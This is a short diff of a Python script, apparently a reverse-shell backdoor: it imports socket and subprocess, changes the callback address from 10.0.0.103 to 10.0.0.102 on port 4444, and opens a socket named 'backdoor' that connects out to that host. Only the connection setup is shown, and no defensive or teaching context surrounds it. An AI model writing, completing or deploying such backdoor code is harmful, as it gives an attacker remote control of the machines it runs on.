@@ -2,7 +2,7 @@ import socket
 import subprocess
 
 
-server_ip = '10.0.0.103'
+server_ip = '10.0.0.102'
 port = 4444
 backdoor = socket.socket()
 backdoor.connect((server_ip, port))
